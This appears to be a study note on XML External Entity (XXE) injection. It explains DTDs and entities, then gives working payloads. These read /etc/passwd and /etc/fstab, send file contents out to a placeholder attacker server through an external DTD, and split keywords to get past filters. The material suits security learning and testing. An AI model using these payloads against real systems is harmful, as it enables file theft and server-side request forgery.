External XML Entities (XXE)
=====================

## Overview

### XML

Extensible Markup Language is a way of structuring data similar to JSON which has overtaken XML in popularity and largely replaced it in general.

#### XML Structure && Syntax

```xml
<?xml version="1.0"?>
<Person>
	<Name>John Smith</Name>
	<Age>20</Age>
</Person>

```

+ Tags are case sensitive
+ "",'',<,> are illegal characters in XML due to the parser not knowing how to handel them

### Entities && The DTD

Entities operate like variables within the XML document where, once defined, they can be used anywhere throughout the document. XML entities live within a specific part of the XML document known as the DTD.


#### Document Type Definition (DTD)

```xml
<?xml version="1.0"?>
<!DOCTYPE Person [
	<!ENTITY name "John">
]>
<Person>
	<Name>&name;</Name>
	<Age>20</Age>
</Person>
```

##### General Entities

```xml
<!ENTITY generalEntity "arbitrary">

<Usage>&generalEntity;</Usage>
```

##### Parameter Entities

```xml
<!ENTITY % outer "<!ENTITY inner 'parameter'>">

```

+ Only allowed inside the DTD
+ More flexiable and can allow the creation of an entity which contains another entity

##### Predefined

```xml
<specialChars>&#x3C;</specialChars>
```

+ Collections of special characters that might break the document normally

## XXE Types

### Inband

+ XML document is parsed 
+ The XML parser reads the document
+ The output of the parser is rendered/output in a response

### Error Based

+ No output
+ A kind of blind XXE injection

### Out of Band (OOB)

+ Entirely blind
+ No output
+ This requires an attack/observation server 
+ The server receives requests made from an entity in the injected payload
+ If the request comes back then the origin site is vulnerable to OOB XXE
+ This also leads to SSRF (Server Side Request Forgery)


## Attacks && Payloads

### Read System Files

```xml
<?xml version="1.0"?>
<!DOCTYPE XXE [
	<!ENTITY payloadEntity SYSTEM "/etc/passwd">
]>
<out>&payloadEntity;</out>
```
+ Here the SYSTEM keyword retrieves arbitrary resources from a URI `/etc/passwd` to insert into the XML document
+ In this way we can achieve arbitrary read 

#### Include Entities Remotely

```xml
<?xml version="1.0"?>
<!DOCTYPE XXE [
	<!ENTITY payloadEntity SYSTEM "https://callback.free.beeceptor.com/test">
]>
<out>&payloadEntity;</out>
```

### External DTD Payloads

+ Because DTDs can be passed as a URI in a `SYSTEM` call they can be loaded externally by the XML parser

```xml
<?xml version="1.0"?>
<!DOCTYPE DTD [
	<!ENTITY % parameter_entity "<!ENTITY secondary_entity 'PwnFunction'>">
	%parameter_entity%
]>

<payload>&secondary_entity;</payload>
```

### Blind XXE Payloads Using External DTDs

#### External DTD (external_payload.dtd)

```xml
<!ENTITY % grabPasswd SYSTEM "file:///etc/passwd">
	<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.server.com/?%grabPasswd;'>">
	%wrapper;
```

+ This will cause the parser to read the contents of `passwd` and store it in the grabPasswd parameter entity
+ This allows the usage of the parameter `grabPasswd` within the DTD
+ Another parameter entity `wrapper` is then created which points to the general entity `send` 
+ When the document is parsed the wrapper entity will spawn the `send` entity as a general entity legally via the external DTD
+ This will then send the contents of `grabPasswd` to the attack server 

#### XXE Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE payload SYSTEM "http://attack.server.com/external_payload.dtd">
<payload>&send;</payload>
```

### Filter Evasion

#### External DTD 

```xml
<!ENTITY % p1 "fi">
<!ENTITY % p2 "le:///etc/pa">
<!ENTITY % p3 "sswd">
<!ENTITY % combined "<!ENTITY pwnFunc SYSTEM '%p1;%p2;%p3;'>">
```

#### Main XML

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE xxe [
    <!ELEMENT xxe ANY>
    <!ENTITY % a SYSTEM "http://termbin.com/mo28">
    %a;
    %combined;
]>
<return>&pwnFunc;</return>
```
+ This will attempt to bypass filters for keywords such as `file` and `passwd`
+ Extra layers can be added until the filter stops detecting trigger words

### Exfiltration && Pitfalls

+ Since some system files that an attacker may attempt to exfiltrate contain xml syntactic characters like `<,>` a work around must be implemented in order to read these files


#### CDATA

+ The character data syntax, `<![CDATA[ <text> ]]` is a way of telling the XML parser to ignore syntactic characters that may arise within this tag
+ Consider its usage in a external DTD payload bellow

```xml
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;
```

+ This leads to the creation of a wrapper with the three parameters desired
